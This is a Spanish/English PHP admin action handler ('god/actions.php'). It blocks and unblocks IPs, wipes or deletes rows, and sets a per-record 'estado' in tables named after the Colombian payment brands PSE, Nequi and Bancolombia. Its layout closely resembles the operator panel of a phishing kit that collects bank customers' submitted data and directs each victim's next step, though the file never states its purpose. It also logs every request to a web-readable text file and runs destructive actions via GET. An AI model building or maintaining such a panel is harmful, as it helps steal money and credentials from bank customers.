<?php
// god/actions.php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
require_once __DIR__ . '/auth.php'; // Protege este archivo
require_once __DIR__ . '/../pagos/db.php';


// Validar parámetros
file_put_contents('debug_actions.txt', date('Y-m-d H:i:s') . " - Request: " . print_r($_GET, true) . "\n", FILE_APPEND);

// Verify if we have at least an action OR a set of id/table/estado
if (isset($_GET['action']) || (isset($_GET['id'], $_GET['table'], $_GET['estado']))) {

    // 1. IP Logic (Global Action)
    if (isset($_GET['action'])) {
        if ($_GET['action'] === 'block_ip' && isset($_GET['ip'])) {
            $stmt = $conn->prepare("INSERT IGNORE INTO blocked_ips (ip) VALUES (:ip)");
            $stmt->execute(['ip' => $_GET['ip']]);
            echo json_encode(['status' => 'success']);
            exit;
        }
        if ($_GET['action'] === 'unblock_ip' && isset($_GET['ip'])) {
            $stmt = $conn->prepare("DELETE FROM blocked_ips WHERE ip = :ip");
            $stmt->execute(['ip' => $_GET['ip']]);
            echo json_encode(['status' => 'success']);
            exit;
        }

        // 2. DELETE ALL Logic (Global Action)
        // Moved here to avoid 'Die: Faltan parámetros' if ID/Table are missing
        if ($_GET['action'] === 'delete_all') {
            try {
                // Delete all from allowed tables
                foreach (['pse', 'nequi', 'bancolombia'] as $t) {
                    // TRUNCATE is faster and resets IDs
                    $conn->exec("TRUNCATE TABLE $t");
                }
                echo json_encode(['status' => 'success', 'message' => 'Panel limpiado correctamente']);
                exit();
            } catch (PDOException $e) {
                echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
                exit();
            }
        }
    }

    // 3. Item Specific Actions (Require ID, Table)
    if (!isset($_GET['id']) || !isset($_GET['table'])) {
        // If we reached here without global action match, and missing ID/Table, it's an error
        die("Faltan parámetros");
    }

    $id = intval($_GET['id']);
    $table = $_GET['table'];
    // State is optional for delete action
    $estado = isset($_GET['estado']) ? intval($_GET['estado']) : 0;

    // Validar nombre de tabla para prevenir SQL Injection
    $allowed_tables = ['nequi', 'pse', 'bancolombia'];
    if (!in_array($table, $allowed_tables)) {
        die("Tabla no permitida");
    }

    // Acción Eliminar Single Item
    if (isset($_GET['action']) && $_GET['action'] === 'delete') {
        try {
            $sql = "DELETE FROM $table WHERE id = :id";
            $stmt = $conn->prepare($sql);
            $stmt->execute(['id' => $id]);
            echo json_encode(['status' => 'success', 'message' => 'Eliminado correctamente']);
            exit();
        } catch (PDOException $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
            exit();
        }
    }

    // Actualizar estado (Default Action if no 'action' param)
    try {
        $sql = "UPDATE $table SET estado = :estado WHERE id = :id";
        $stmt = $conn->prepare($sql);
        $stmt->execute(['estado' => $estado, 'id' => $id]);

        echo json_encode(['status' => 'success', 'message' => 'Estado actualizado']);
        exit();
    } catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        exit();
    }

} else {
    die("Faltan parámetros");
}
?>
